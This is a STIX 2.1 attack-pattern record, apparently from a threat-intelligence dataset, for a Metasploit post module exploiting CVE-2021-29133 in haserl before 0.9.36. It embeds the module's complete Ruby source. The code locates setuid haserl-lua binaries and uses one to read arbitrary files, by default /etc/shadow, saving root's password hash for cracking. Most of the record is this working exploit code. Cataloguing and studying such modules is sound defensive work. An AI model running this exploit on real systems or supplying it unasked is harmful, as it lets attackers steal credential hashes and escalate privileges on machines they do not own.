{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87f1ae97-6214-4db9-9d92-e0a606ec599c",
    "created": "2024-08-14T16:33:17.306218Z",
    "modified": "2024-08-14T16:33:17.306222Z",
    "name": "Haserl Arbitrary File Reader",
    "description": " This module exploits haserl prior to 0.9.36 to read arbitrary files. The most widely accepted exploitation vector is reading /etc/shadow which will reveal root's hash for cracking.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/haserl_read.rb",
            "external_id": "haserl_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/steaIth/status/1364940271054712842"
        },
        {
            "source_name": "reference",
            "url": "https://gitlab.alpinelinux.org/alpine/aports/-/issues/12539"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-29133"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Haserl Arbitrary File Reader',\n        'Description' => %q{\n          This module exploits haserl prior to 0.9.36 to read arbitrary files.\n          The most widely accepted exploitation vector is reading /etc/shadow,\n          which will reveal root's hash for cracking.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Julien (jvoisin) Voisin', # metasploit module\n          'Ike Broflovski' # discovery\n        ],\n        'Platform' => [ 'linux' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'References' => [\n          ['URL', 'https://twitter.com/steaIth/status/1364940271054712842'],\n          ['URL', 'https://gitlab.alpinelinux.org/alpine/aports/-/issues/12539'],\n          ['CVE', '2021-29133']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptString.new('RFILE', [true, 'File to read', '/etc/shadow']),\n    ])\n  end\n\n  def haserl_lua_paths\n    begin\n      files = get_suid_files('/usr/bin')\n    rescue StandardError\n      return\n    end\n\n    return unless files\n\n    return files.select { |f| File.basename(f).starts_with?('haserl-lua') }\n  end\n\n  def run\n    if is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges')\n    end\n\n    files = haserl_lua_paths\n\n    if files.nil? || files.empty?\n      fail_with(Failure::NotVulnerable, 'Could not find setuid haserl lua executable in /usr/bin/')\n    end\n\n    binary = files.first\n\n    print_good(\"Found set-uid haserl: #{binary}\")\n\n    output = cmd_exec(\"#{binary} '#{datastore['RFILE']}'\")\n\n    return if output.empty?\n\n    fname = File.basename(datastore['RFILE'].downcase)\n    p = store_loot(\n      \"haserl_#{fname}\",\n      'text/plain',\n      session,\n      output,\n      \"haserl_#{fname}\",\n      'haserl arbitrary read'\n    )\n    vprint_good(\"#{fname} saved in: #{p}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}